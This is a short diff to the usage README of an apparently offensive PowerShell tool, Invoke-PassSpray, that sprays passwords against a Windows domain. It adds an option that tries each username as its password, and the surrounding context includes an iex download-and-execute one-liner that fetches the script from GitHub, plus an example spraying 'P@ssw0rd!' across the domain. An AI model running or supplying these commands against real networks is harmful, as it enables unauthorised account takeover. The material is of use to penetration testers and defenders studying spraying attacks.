@@ -13,6 +13,11 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 Invoke-PassSpray
 ```
 
+### Spray UserName as a password
+```
+Invoke-PassSpray -UserAsPassword
+```
+
 ### Spray a password across the Domain
 ```
 Invoke-PassSpray -Password P@ssw0rd!
